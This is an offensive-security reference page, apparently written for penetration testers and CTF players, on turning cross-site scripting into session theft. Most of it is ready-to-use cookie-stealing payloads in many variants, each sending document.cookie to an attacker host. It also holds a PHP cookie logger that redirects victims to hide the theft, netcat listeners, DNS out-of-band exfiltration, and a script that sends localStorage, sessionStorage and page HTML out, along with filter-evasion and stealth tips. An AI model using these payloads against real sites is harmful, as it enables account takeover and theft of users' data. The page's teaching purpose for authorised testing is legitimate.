@@ -1,0 +1,379 @@
+---
+title: XSS to Session
+description: Using cross-site scripting as a session-stealing primitive - document.cookie exfiltration patterns, HttpOnly check, the cookie-logger PHP server, and modern callback infrastructure (XSSHunter, Burp Collaborator, Interactsh) for blind XSS verification.
+mitre: [T1539, T1059.007, T1185]
+d3fend: [D3-CBV, D3-NTA]
+impact: [SessionTakeover, CredentialTheft]
+owasp: [A03, A07]
+sidebar:
+  order: 5
+  label: XSS to Session
+---
+
+## TL;DR
+
+When XSS executes in a victim's browser and their session cookies *aren't* `HttpOnly`, the cookies are JavaScript-readable as `document.cookie` and the attacker can send them anywhere. The exfiltration step is mechanical once the XSS is in place:
+
+```
+# 1. Confirm cookies are JavaScript-readable
+//  Open DevTools console on the target, type:
+document.cookie
+//  If session cookies appear in the output, HttpOnly is missing → exfiltrate-able
+
+# 2. The exfiltration payloads (one-liners)
+<script>fetch('http://attacker:8000/?c=' + btoa(document.cookie))</script>
+<img src=x onerror="fetch('http://attacker:8000/?c=' + btoa(document.cookie))">
+
+# 3. Listener - receives the cookie
+python3 -m http.server 8000
+# Or for cleaner logging:
+nc -nlvp 8000
+
+# 4. Decode the captured value
+echo 'YXV0aC1zZXNzaW9uPWFiYzEyMy4uLg==' | base64 -d
+# auth-session=abc123...
+```
+
+Success indicator: your listener receives an HTTP request with the victim's cookie in the URL parameter; decoded, it's the valid session identifier you can use to hijack.
+
+## The HttpOnly gate
+
+`HttpOnly` is a cookie attribute that *forbids* JavaScript access. With `HttpOnly` set:
+
+```
+Set-Cookie: auth-session=abc123; HttpOnly; Secure; SameSite=Strict
+```
+
+The browser sends this cookie on every request to the origin but `document.cookie` doesn't return it. XSS can do everything else in the victim's browser but it can't read `auth-session`.
+
+Without `HttpOnly`:
+
+```
+Set-Cookie: auth-session=abc123; Secure; SameSite=Strict
+```
+
+`document.cookie` returns `"auth-session=abc123"`. XSS reads it. Game over for session secrecy.
+
+**Always check first**: in the target's DevTools, run `document.cookie`. If your session cookie's name appears, XSS-to-session works. If it doesn't, the cookie is HttpOnly and you need a different angle (CSRF, see [CSRF](/codex/web/sessions/csrf/), or the XSS-CSRF chain in [XSS + CSRF chain](/codex/web/sessions/xss-csrf-chain/)).
+
+You can also check from the Application/Storage tab - Cookies → look at the `HttpOnly` column. Or from curl:
+
+```shell
+curl -sI http://target/login -X POST -d 'user=test&pass=test' | grep -i set-cookie
+# Set-Cookie: auth-session=...; HttpOnly; Secure
+#                              ^^^^^^^^ - present means JS can't read
+```
+
+## XSS variants and where they fire
+
+Brief refresher since this isn't the dedicated XSS page:
+
+| Type | Where the payload lives | When it fires |
+| --- | --- | --- |
+| **Reflected** | URL parameter, header, form input - bounced back unescaped in response | When victim visits the crafted URL |
+| **Stored** | Database, file, app state - persisted server-side | Every time *anyone* views the page that renders it |
+| **DOM-based** | URL fragment (`#...`), `postMessage`, other client-only sources | When victim visits the URL; never reaches the server |
+| **Blind** | Stored payload in admin-only context (logs, support tickets, audit views) | When an admin views the affected page later |
+
+For session theft, **stored** XSS is the operator's prize - it persists, fires on every viewer (including admins), and the exfiltration runs without coordinating with the victim. Reflected works but requires the victim to click your link. DOM-based is similar to reflected in delivery. Blind is the highest-value because the firing audience tends to be high-privilege.
+
+## The exfiltration payloads
+
+Several flavors of cookie-stealer, each with tradeoffs.
+
+### Pattern 1 - `<script>` tag with fetch
+
+```html
+<script>fetch('http://ATTACKER:8000/c?d=' + btoa(document.cookie))</script>
+```
+
+Clean, modern, no redirect needed. `fetch` makes the request asynchronously; the victim's browsing experience continues unchanged. `btoa` base64-encodes the cookie so special characters (`=`, `;`, `+`) don't corrupt the URL.
+
+Sometimes `<script>` tags are filtered by app-side input sanitization. Move to pattern 2.
+
+### Pattern 2 - `<img onerror>` (the classic)
+
+```html
+<img src=x onerror="fetch('http://ATTACKER:8000/c?d=' + btoa(document.cookie))">
+```
+
+`src=x` is a guaranteed-bad URL, triggering `onerror` immediately. Inside the handler, run the exfil. Works when `<script>` is filtered but `<img>` isn't (common - apps often allow images for legitimate use).
+
+### Pattern 3 - `<video onerror>` / `<audio onerror>` / `<svg onload>`
+
+For when `<img>` is also filtered:
+
+```html
+<svg onload="fetch('http://ATTACKER:8000/c?d=' + btoa(document.cookie))">
+<video><source onerror="fetch('http://ATTACKER:8000/c?d=' + btoa(document.cookie))"></video>
+```
+
+Modern browsers fire these in essentially the same conditions as `<img onerror>`. Pick whichever passes the app's filter.
+
+### Pattern 4 - Self-triggering animation (HTB-style)
+
+```html
+<style>@keyframes x{}</style>
+<video style="animation-name:x"
+       onanimationend="window.location='http://ATTACKER:8000/log.php?c='+document.cookie">
+</video>
+```
+
+The `@keyframes x{}` is an empty animation; assigning it to a `<video>` causes `onanimationend` to fire immediately. Less commonly filtered because the components are unusual (animations are rarely in filter blocklists; `<video>` is allowed for embedding).
+
+Note this one uses `window.location` rather than `fetch` - it *navigates* the victim away to your URL. The cookie hits your server because it's part of the URL. Downsides:
+
+- The victim notices the navigation (page disappears)
+- After your server receives the request, you should redirect back to the original site (`header("Location: http://target/")`) so the victim doesn't realize what happened
+
+Use `fetch` for stealth; use `window.location` if `fetch` is blocked by CSP.
+
+### Pattern 5 - Image-creation via `document.write`
+
+```html
+<h1 onmouseover='document.write(`<img src="http://ATTACKER:8000/?c=${btoa(document.cookie)}">`)'>
+  hover me
+</h1>
+```
+
+Triggers on hover (`onmouseover`). The `document.write` injects a new `<img>` whose `src` includes the cookie - the browser tries to fetch the image, your server receives the URL.
+
+Use case: when payload size is constrained and event handlers are filtered for `script` keyword but not for `mouseover`.
+
+### Pattern 6 - onload
+
+```html
+<body onload="fetch('http://ATTACKER:8000/c?d=' + btoa(document.cookie))">
+```
+
+Fires once the body loads. The attacker has to inject into a context where `<body>` tag attributes are reachable - possible in some HTML-injection-flavored XSS but not all.
+
+### Pattern 7 - `<iframe srcdoc>` for sandbox-aware exfil
+
+```html
+<iframe srcdoc="<script>parent.fetch('http://ATTACKER:8000/c?d=' + btoa(parent.document.cookie))</script>"></iframe>
+```
+
+Sometimes useful when the iframe context doesn't have the cookies but the parent does and same-origin policy permits the inner script to read the parent.
+
+## The HTTPS gotcha
+
+When the target site uses HTTPS, your exfil URL must also be HTTPS - modern browsers block "mixed content" (HTTPS page making HTTP request) silently:
+
+```
+[blocked] http://attacker:8000/  (mixed content; blocked by browser)
+[ok]      https://attacker.com/  (matching scheme)
+```
+
+The browser fires no error message that the page can see; the request simply doesn't go out. You watch your listener, see nothing, and the payload looks broken.
+
+Solutions:
+
+1. **HTTPS endpoint** - run your listener behind an HTTPS-terminating proxy (Caddy, ngrok, Cloudflare tunnel) so the URL is `https://`
+2. **Out-of-band channel** - use DNS exfil instead of HTTP. `<img src="http://${btoa(document.cookie)}.attacker.com/">` triggers a DNS lookup containing the cookie even if no HTTP request actually goes out. Pair with `XSSHunter` or `Interactsh` (next section).
+3. **Site-internal URL** - chain via an open redirect on the target site to your endpoint; the *first* hop is same-scheme so it's allowed.
+
+## Callback infrastructure
+
+A bare PHP cookie-logger or Netcat listener works in CTFs but real engagements need more.
+
+### Simple PHP cookie logger
+
+```php
+<?php
+// log.php - minimal cookie logger
+$logFile = "cookieLog.txt";
+$cookie  = $_REQUEST["c"] ?? "(empty)";
+$ip      = $_SERVER["REMOTE_ADDR"];
+$ua      = $_SERVER["HTTP_USER_AGENT"];
+$time    = date('Y-m-d H:i:s');
+
+$handle = fopen($logFile, "a");
+fwrite($handle, "[$time] $ip ($ua)\n$cookie\n\n");
+fclose($handle);
+
+// Redirect away so the victim's browser appears to navigate normally
+header("Location: https://www.google.com/");
+exit;
+?>
+```
+
+Save as `log.php`. Serve with:
+
+```shell
+php -S 0.0.0.0:8000
+```
+
+The exfil payload then targets `http://YOUR-IP:8000/log.php?c=...`. The log file contains:
+
+```
+[2024-09-30 11:23:45] 10.10.14.5 (Mozilla/5.0 ...)
+auth-session=eyJhbGciOiJIUzI1NiJ9...
+
+[2024-09-30 11:24:01] 192.168.1.20 (Mozilla/5.0 ...)
+auth-session=other-victim-cookie...
+```
+
+Each hit is timestamped, IP-stamped, UA-stamped. Useful for identifying which victim sent which cookie when multiple are firing.
+
+### Netcat listener
+
+For one-shot use:
+
+```shell
+$ nc -nlvp 8000
+listening on [any] 8000 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.14.7] 43210
+GET /?c=YXV0aC1zZXNzaW9uPWVKaGJHY2lP... HTTP/1.1
+Host: 10.10.14.5:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64)
+Accept: */*
+Referer: http://xss.htb.net/profile?email=...
+```
+
+The Referer header is bonus: tells you exactly which page the XSS fired on. Useful for confirming which payload location triggered.
+
+After the first hit, Netcat closes. For multiple captures, loop:
+
+```shell
+while true; do nc -nlvp 8000; done
+```
+
+### XSSHunter / xss.report
+
+[XSS Hunter](https://xsshunter.com) (now self-hosted) and forks like xss.report provide:
+
+- A unique callback domain per probe
+- Full screenshot of the victim's browser at the moment of exfil
+- DOM snapshot
+- Cookies, localStorage, sessionStorage all captured
+- Origin URL, victim IP, victim UA
+
+The payload becomes:
+
+```html
+<script src="//YOUR-SUBDOMAIN.xss.ht"></script>
+```
+
+That's it. Their server-side JS does all the exfiltration including HttpOnly-aware data (since it runs in the victim's context).
+
+The screenshot is the killer feature - it captures what the victim was actually looking at when the payload fired. For blind XSS (where you injected the payload in an admin-only context and have no way to know if/when it fires), the screenshot is your only evidence the attack worked.
+
+### Burp Collaborator
+
+PortSwigger's Burp Collaborator is the same idea, integrated into Burp:
+
+```
+http://[random].burpcollaborator.net
+```
+
+Every HTTP, DNS, or SMTP request to the random subdomain shows up in Burp's Collaborator tab. For session-cookie exfil, you'd use the HTTP endpoint:
+
+```html
+<img src=x onerror="fetch('http://[random].burpcollaborator.net/?c=' + btoa(document.cookie))">
+```
+
+Pro plan only for the public Collaborator server. Self-hosting is possible.
+
+### Project Interactsh
+
+[Interactsh](https://github.com/projectdiscovery/interactsh) is the open-source equivalent - self-hostable, supports DNS / HTTP / SMTP. Run a private instance, get unique subdomains, capture all out-of-band callbacks.
+
+```shell
+# Run client (gets you a unique subdomain)
+$ interactsh-client
+[xx.xx.xx.xx] Got HTTP interaction from xyz.oast.live
+[xx.xx.xx.xx] Got DNS interaction from xyz.oast.live
+```
+
+DNS-based exfil works even when HTTP is blocked outbound from the victim's network:
+
+```html
+<img src="x" onerror="fetch('http://'+btoa(document.cookie).slice(0,60)+'.xyz.oast.live')">
+```
+
+The DNS query to the encoded subdomain reaches Interactsh's DNS server; you read the subdomain to recover the cookie value.
+
+## Encoding considerations
+
+`btoa(document.cookie)` does base64 - most cookie values are URL-safe but `+` and `/` are not, so base64 with no further encoding works as an inline URL parameter:
+
+```javascript
+fetch('http://attacker/c?d=' + btoa(document.cookie))
+//  http://attacker/c?d=YXV0aC1zZXNzaW9uPWFiYzEyMzs=
+```
+
+Note `=` padding survives URL inclusion in modern browsers. If your callback infrastructure is fussy:
+
+```javascript
+fetch('http://attacker/c?d=' + encodeURIComponent(btoa(document.cookie)))
+```
+
+Or hex:
+
+```javascript
+const hex = s => Array.from(s).map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
+fetch('http://attacker/c?d=' + hex(document.cookie));
+```
+
+Recover with `xxd -r -p` or `Buffer.from(hex, 'hex').toString()`.
+
+## The whole-context exfil - not just cookies
+
+Once XSS fires, you can grab *everything* in the victim's browser tab:
+
+```javascript
+const data = {
+  cookie:    document.cookie,
+  href:      document.location.href,
+  referrer:  document.referrer,
+  localStorage: Object.entries(localStorage),
+  sessionStorage: Object.entries(sessionStorage),
+  html:      document.documentElement.outerHTML.slice(0, 50000),  // limit size
+};
+fetch('http://attacker/c', {
+  method: 'POST',
+  body: JSON.stringify(data),
+  mode: 'no-cors',
+});
+```
+
+This catches:
+
+- Cookies (if not HttpOnly)
+- The page the victim is on (URL - useful for confirming which page triggered)
+- The Referer (where they came from)
+- localStorage - often contains JWT tokens, user IDs, app state
+- sessionStorage - same
+- HTML snapshot - useful for spotting nonces, CSRF tokens embedded in the DOM, user data displayed on screen
+
+The `mode: 'no-cors'` is important - without it, the fetch is blocked by CORS for cross-origin POSTs. With it, the browser sends the request opaquely (you can't read the response from JS but your server can read the body).
+
+## Defense considerations
+
+When your exfil isn't working, walk down this checklist:
+
+1. **`document.cookie` returns empty or doesn't contain the session cookie** → HttpOnly is set on it. XSS can't read it. See [XSS + CSRF chain](/codex/web/sessions/xss-csrf-chain/) for the alternative.
+2. **No listener hit at all** → mixed-content blocking (HTTPS target making HTTP exfil request), CSP `connect-src` blocking, network egress filtering on the victim's network. Try DNS-based out-of-band.
+3. **Payload doesn't fire** → app-side input sanitization. Try alternate event handlers (`onmouseover`, `onanimationend`, `onloadstart`).
+4. **Payload fires but cookie is empty** → cookie is HttpOnly, or the cookie's path/domain doesn't match the page the XSS is on.
+5. **CSP errors in console** → the app has a Content Security Policy that forbids inline scripts or external fetches. Look for `report-uri` directives that might leak which directive was violated. Bypass via `data:` URLs, `<base>` tag injection, or CSP-specific bypasses (a separate topic).
+
+## Quick reference
+
+| Task | Payload / command |
+| --- | --- |
+| Check HttpOnly | DevTools console → `document.cookie` |
+| `<script>` exfil | `<script>fetch('http://A/?c='+btoa(document.cookie))</script>` |
+| `<img onerror>` exfil | `<img src=x onerror="fetch('http://A/?c='+btoa(document.cookie))">` |
+| `<svg onload>` | `<svg onload="fetch('http://A/?c='+btoa(document.cookie))">` |
+| Hover exfil | `<h1 onmouseover="fetch('http://A/?c='+btoa(document.cookie))">x</h1>` |
+| Whole-context POST | See `fetch('http://A/c', {method:'POST', body:..., mode:'no-cors'})` |
+| PHP cookie logger | Save `log.php`, run `php -S 0.0.0.0:8000` |
+| Netcat one-shot | `nc -nlvp 8000` |
+| Netcat looping | `while true; do nc -nlvp 8000; done` |
+| Decode base64 cookie | `echo 'X' \| base64 -d` |
+| XSSHunter probe | `<script src="//SUB.xss.ht"></script>` |
+| Burp Collaborator | unique `.burpcollaborator.net` URL |
+| Interactsh | `interactsh-client` for unique `.oast.live` |
+| DNS exfil pattern | `<img src='http://'+btoa(c).slice(0,60)+'.oast.live'>` |
